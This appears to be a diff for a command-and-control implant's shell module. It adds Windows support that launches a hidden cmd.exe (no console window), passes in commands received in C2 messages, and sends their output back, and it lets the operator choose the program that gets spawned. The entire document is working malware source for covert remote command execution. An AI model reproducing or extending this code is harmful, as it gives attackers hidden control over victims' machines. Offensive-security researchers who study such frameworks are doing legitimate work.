@@ -7,6 +7,8 @@
 #include <unistd.h>
 #include <sys/select.h>
 #include <sys/wait.h>
+#elif _WIN32
+#include <windows.h>
 #endif
 #include <chrono>
 
@@ -34,10 +36,17 @@ Shell::Shell()
     : ModuleCmd("", moduleHash)
 #endif
 {
+#ifdef _WIN32
+    ZeroMemory(&m_pi, sizeof(m_pi));
+    m_hChildStdoutRd = NULL;
+    m_hChildStdinWr = NULL;
+    m_program = "cmd.exe /Q /K";
+#else
     m_masterFd = -1;
     m_pid = -1;
-    m_started = false;
     m_program = "/bin/bash";
+#endif
+    m_started = false;
 }
 
 Shell::~Shell()
@@ -107,8 +116,54 @@ int Shell::startShell()
     m_pid = pid;
     m_started = true;
     return 0;
-#else
-    return 1;
+#elif _WIN32
+    if(m_started)
+        return 0;
+
+    SECURITY_ATTRIBUTES saAttr;
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+
+    HANDLE outRd = NULL, outWr = NULL;
+    HANDLE inRd = NULL, inWr = NULL;
+
+    if(!CreatePipe(&outRd, &outWr, &saAttr, 0))
+        return 1;
+    if(!SetHandleInformation(outRd, HANDLE_FLAG_INHERIT, 0))
+        return 1;
+    if(!CreatePipe(&inRd, &inWr, &saAttr, 0))
+        return 1;
+    if(!SetHandleInformation(inWr, HANDLE_FLAG_INHERIT, 0))
+        return 1;
+
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.hStdError = outWr;
+    si.hStdOutput = outWr;
+    si.hStdInput = inRd;
+    si.dwFlags |= STARTF_USESTDHANDLES;
+
+    ZeroMemory(&pi, sizeof(pi));
+
+    BOOL ok = CreateProcessA(NULL, const_cast<LPSTR>(m_program.c_str()), NULL, NULL, TRUE,
+                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    CloseHandle(outWr);
+    CloseHandle(inRd);
+    if(!ok)
+    {
+        CloseHandle(outRd);
+        CloseHandle(inWr);
+        return 1;
+    }
+
+    m_hChildStdoutRd = outRd;
+    m_hChildStdinWr = inWr;
+    m_pi = pi;
+    m_started = true;
+    return 0;
 #endif
 }
 
@@ -124,6 +179,22 @@ void Shell::stopShell()
     close(m_masterFd);
     m_masterFd = -1;
     m_pid = -1;
+    m_started = false;
+#elif _WIN32
+    if(!m_started)
+        return;
+
+    DWORD written = 0;
+    const char* exitCmd = "exit\n";
+    WriteFile(m_hChildStdinWr, exitCmd, (DWORD)strlen(exitCmd), &written, NULL);
+    WaitForSingleObject(m_pi.hProcess, INFINITE);
+    CloseHandle(m_hChildStdinWr);
+    CloseHandle(m_hChildStdoutRd);
+    CloseHandle(m_pi.hProcess);
+    CloseHandle(m_pi.hThread);
+    m_hChildStdinWr = NULL;
+    m_hChildStdoutRd = NULL;
+    ZeroMemory(&m_pi, sizeof(m_pi));
     m_started = false;
 #endif
 }
@@ -200,8 +271,72 @@ int Shell::process(C2Message &c2Message, C2Message &c2RetMessage)
 
     c2RetMessage.set_instruction(c2Message.instruction());
     c2RetMessage.set_returnvalue(output);
-#else
-    c2RetMessage.set_errorCode(1);
+#elif _WIN32
+    if(!m_started)
+    {
+        if(!cmd.empty())
+            m_program = cmd;
+        if(startShell() != 0)
+        {
+            c2RetMessage.set_errorCode(1);
+            return 0;
+        }
+        if(cmd.empty())
+        {
+            c2RetMessage.set_instruction(c2Message.instruction());
+            c2RetMessage.set_returnvalue("shell started");
+            return 0;
+        }
+    }
+
+    if(cmd == "exit")
+    {
+        stopShell();
+        c2RetMessage.set_instruction(c2Message.instruction());
+        c2RetMessage.set_returnvalue("shell terminated");
+        return 0;
+    }
+
+    if(!cmd.empty())
+    {
+        DWORD written = 0;
+        std::string send = cmd + "\n";
+        WriteFile(m_hChildStdinWr, send.c_str(), (DWORD)send.size(), &written, NULL);
+    }
+
+    std::string output;
+    char buffer[512];
+    DWORD bytes = 0;
+    auto end = std::chrono::steady_clock::now() + std::chrono::seconds(5);
+    while(std::chrono::steady_clock::now() < end)
+    {
+        DWORD avail = 0;
+        if(!PeekNamedPipe(m_hChildStdoutRd, NULL, 0, NULL, &avail, NULL))
+            break;
+        if(avail)
+        {
+            if(ReadFile(m_hChildStdoutRd, buffer, min<DWORD>(sizeof(buffer), avail), &bytes, NULL) && bytes > 0)
+            {
+                output.append(buffer, bytes);
+                end = std::chrono::steady_clock::now() + std::chrono::seconds(2);
+            }
+            else
+            {
+                break;
+            }
+        }
+        else if(!output.empty())
+        {
+            break;
+        }
+        else
+        {
+            Sleep(100);
+        }
+    }
+
+    c2RetMessage.set_instruction(c2Message.instruction());
+    c2RetMessage.set_returnvalue(output);
 #endif
     return 0;
 }
